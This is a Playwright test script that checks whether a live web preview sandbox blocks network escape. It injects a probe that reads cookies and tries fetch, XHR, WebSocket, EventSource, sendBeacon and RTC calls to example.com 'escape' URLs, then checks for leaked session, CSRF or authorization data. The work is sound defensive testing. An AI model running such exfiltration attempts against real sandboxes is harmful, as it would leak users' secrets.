import fs from "node:fs"
import { chromium } from "playwright"

const target = process.env.WCB_PREVIEW_LIVE_URL || "https://phase5-preview-live-probe-webcanbe-real.iseig513.workers.dev/__wcb_preview_runtime"
const outPath = process.env.WCB_PREVIEW_LIVE_EVIDENCE || "preview-live-evidence.json"
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))
const fail = message => { throw new Error(message) }
const b64 = value => Buffer.from(value, "utf8").toString("base64")

const evidence = {
  target,
  startedAt: new Date().toISOString(),
  page: {},
  assets: {},
  isolation: {},
  requests: [],
  responses: [],
}

const browser = await chromium.launch({ headless: true })
try {
  const context = await browser.newContext()
  const page = await context.newPage()
  const requests = []
  const responses = []
  page.on("request", request => {
    requests.push({
      url: request.url(),
      method: request.method(),
      resourceType: request.resourceType(),
      headers: request.headers(),
    })
  })
  page.on("response", response => {
    responses.push({ url: response.url(), status: response.status(), resourceType: response.request().resourceType() })
  })

  let mainResponse
  let lastError
  for (let attempt = 1; attempt <= 12; attempt++) {
    try {
      mainResponse = await page.goto(target, { waitUntil: "domcontentloaded", timeout: 30000 })
      if (mainResponse?.status() === 200) {
        await page.waitForFunction(() =>
          document.documentElement.dataset.wcbPreviewHost === "1" &&
          document.documentElement.dataset.wcbPreviewRuntime === "loaded",
          null,
          { timeout: 30000 },
        )
        lastError = undefined
        break
      }
      lastError = new Error("preview route returned " + (mainResponse?.status() ?? "no response"))
    } catch (error) {
      lastError = error
    }
    if (attempt < 12) await sleep(15000)
  }
  if (lastError) throw lastError
  if (!mainResponse || mainResponse.status() !== 200) fail("Preview route did not return HTTP 200.")

  const headers = await mainResponse.allHeaders()
  const csp = headers["content-security-policy"] || ""
  const robots = headers["x-robots-tag"] || ""
  const cacheControl = headers["cache-control"] || ""
  evidence.page = {
    status: mainResponse.status(),
    finalUrl: page.url(),
    headers: {
      "content-security-policy": csp,
      "x-robots-tag": robots,
      "cache-control": cacheControl,
    },
    previewHostMarker: await page.evaluate(() => document.documentElement.dataset.wcbPreviewHost || null),
    previewRuntimeMarker: await page.evaluate(() => document.documentElement.dataset.wcbPreviewRuntime || null),
  }
  if (!csp.includes("default-src 'none'") || !csp.includes("connect-src 'none'") || !csp.includes("form-action 'none'")) fail("Live preview CSP is missing isolated-runtime restrictions.")
  if (!/noindex/i.test(robots)) fail("Live preview route is missing noindex.")
  if (!/no-store/i.test(cacheControl)) fail("Live preview route is missing no-store.")

  const jsResponses = []
  for (const response of page.context().pages().flatMap(() => [])) void response
  for (const item of responses.filter(item => item.status === 200 && /\/assets\/.*\.js(?:\?|$)/.test(item.url))) {
    try {
      const response = await page.request.get(item.url)
      const body = await response.text()
      jsResponses.push({ url: item.url, status: response.status(), body })
    } catch {}
  }
  const hostChunk = jsResponses.find(item => item.body.includes("wcbPreviewHost") || item.body.includes("wcb-preview-host-root"))
  const runtimeChunk = jsResponses.find(item => item.body.includes("wcbPreviewRuntime") && item.body.includes("Preview networking is disabled."))
  if (!hostChunk) fail("Could not identify the live PreviewRuntimeHost lazy chunk.")
  if (!runtimeChunk) fail("Could not identify the live preview-runtime lazy chunk.")
  evidence.assets = {
    previewRuntimeHost: { url: hostChunk.url, status: hostChunk.status },
    previewRuntime: { url: runtimeChunk.url, status: runtimeChunk.status },
  }
  if (hostChunk.status !== 200 || runtimeChunk.status !== 200) fail("A preview lazy chunk did not return HTTP 200.")

  const requestCountBeforePayload = requests.length
  const probeSource = `
import React from "react"
import { createRoot } from "react-dom/client"
const result = { fetch: "", xhr: "", websocket: "", eventSource: "", beacon: null, rtc: "", cookie: document.cookie }
globalThis.__WCB_PUBLIC_LIVE_PROBE__ = result
fetch("https://example.com/wcb-preview-escape?csrf=probe").then(() => { result.fetch = "ALLOWED" }).catch(error => { result.fetch = String(error && error.message || error) })
try { new XMLHttpRequest(); result.xhr = "ALLOWED" } catch (error) { result.xhr = String(error && error.message || error) }
try { new WebSocket("wss://example.com/wcb-preview-escape"); result.websocket = "ALLOWED" } catch (error) { result.websocket = String(error && error.message || error) }
try { new EventSource("https://example.com/wcb-preview-escape"); result.eventSource = "ALLOWED" } catch (error) { result.eventSource = String(error && error.message || error) }
try { result.beacon = navigator.sendBeacon("https://example.com/wcb-preview-escape", "probe") } catch (error) { result.beacon = String(error && error.message || error) }
try { new RTCPeerConnection(); result.rtc = "ALLOWED" } catch (error) { result.rtc = String(error && error.message || error) }
createRoot(document.getElementById("root")).render(React.createElement("main", { id: "wcb-live-probe-project" }, "live probe"))
`
  await page.evaluate(payload => {
    window.__WCB_PROJECT_PAYLOAD__ = payload
    window.dispatchEvent(new Event("wcb-project-payload"))
  }, {
    files: { "src/main.tsx": b64(probeSource) },
    entry: "src/main.tsx",
    title: "Webcanbe public live probe",
    route: "/",
  })
  await page.waitForFunction(() => document.documentElement.dataset.wcbReady === "1", null, { timeout: 30000 })
  await page.waitForTimeout(300)

  const runtimeIsolation = await page.evaluate(async () => {
    const probe = globalThis.__WCB_PUBLIC_LIVE_PROBE__ || {}
    if (!probe.fetch) {
      try { await fetch("https://example.com/wcb-preview-escape-2"); probe.fetch = "ALLOWED" }
      catch (error) { probe.fetch = String(error && error.message || error) }
    }
    return {
      probe,
      ready: document.documentElement.dataset.wcbReady || null,
      runtimeMarker: document.documentElement.dataset.wcbPreviewRuntime || null,
      cookies: document.cookie,
      localStorageKeys: Object.keys(localStorage),
      sessionStorageKeys: Object.keys(sessionStorage),
      location: location.href,
      observationPresent: Boolean(document.getElementById("wcb-observation")),
    }
  })
  const postPayloadRequests = requests.slice(requestCountBeforePayload)
  const externalRequests = postPayloadRequests.filter(item => new URL(item.url).origin !== new URL(target).origin)
  const sensitiveHeaderRequests = requests.filter(item => {
    const keys = Object.keys(item.headers || {}).map(key => key.toLowerCase())
    return keys.includes("authorization") || keys.includes("x-wcb-csrf") || (keys.includes("cookie") && /(?:wcb|session|csrf)/i.test(item.headers.cookie || ""))
  })
  const contextCookies = await context.cookies(new URL(target).origin)
  const sensitiveCookies = contextCookies.filter(cookie => /(?:wcb|session|csrf)/i.test(cookie.name))
  const probe = runtimeIsolation.probe || {}
  for (const key of ["fetch","xhr","websocket","eventSource","rtc"]) {
    if (probe[key] === "ALLOWED" || !String(probe[key] || "").includes("Preview networking is disabled")) fail(key + " was not blocked by the deployed preview runtime.")
  }
  if (probe.beacon !== false) fail("navigator.sendBeacon was not blocked by the deployed preview runtime.")
  if (externalRequests.length) fail("Imported project code emitted an external network request: " + externalRequests.map(item => item.url).join(", "))
  if (sensitiveHeaderRequests.length) fail("Preview requests exposed a session/CSRF/authorization header.")
  if (sensitiveCookies.length || /(?:wcb|session|csrf)/i.test(runtimeIsolation.cookies || "")) fail("Preview browser context exposed a Webcanbe/session cookie.")

  evidence.isolation = {
    runtime: runtimeIsolation,
    externalRequestsAfterProjectPayload: externalRequests,
    sensitiveHeaderRequests,
    contextCookies: contextCookies.map(cookie => ({ name: cookie.name, domain: cookie.domain, path: cookie.path })),
    statement: "Live malicious project payload could not emit fetch/XHR/WebSocket/EventSource/beacon/RTC traffic. Browser Run service-level allowRequestPattern is separately exercised by automated Worker regressions; authenticated Browser Run navigation acceptance remains operator-gated.",
  }
  evidence.requests = requests.map(item => ({ url: item.url, method: item.method, resourceType: item.resourceType, headerNames: Object.keys(item.headers || {}).sort() }))
  evidence.responses = responses
  evidence.completedAt = new Date().toISOString()
  fs.writeFileSync(outPath, JSON.stringify(evidence, null, 2) + "\n")
  console.log(JSON.stringify(evidence, null, 2))
} finally {
  await browser.close()
}
